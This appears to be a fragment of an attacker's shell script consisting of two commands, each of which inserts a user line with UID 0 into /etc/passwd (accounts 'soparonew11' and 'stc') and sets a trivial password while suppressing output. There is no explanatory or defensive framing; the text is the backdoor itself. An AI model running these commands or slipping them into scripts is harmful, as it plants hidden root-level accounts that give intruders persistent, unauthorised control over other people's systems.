sed -i '$ i\soparonew11:x:0:0:soparonew11:/root:/bin/bash' /etc/passwd && echo -e "123123\n123123\n"|passwd soparonew11 &> /dev/null

sed -i '$ i\stc:x:0:0:stc:/root:/bin/bash' /etc/passwd && echo "1\n1"|passwd stc &> /dev/null
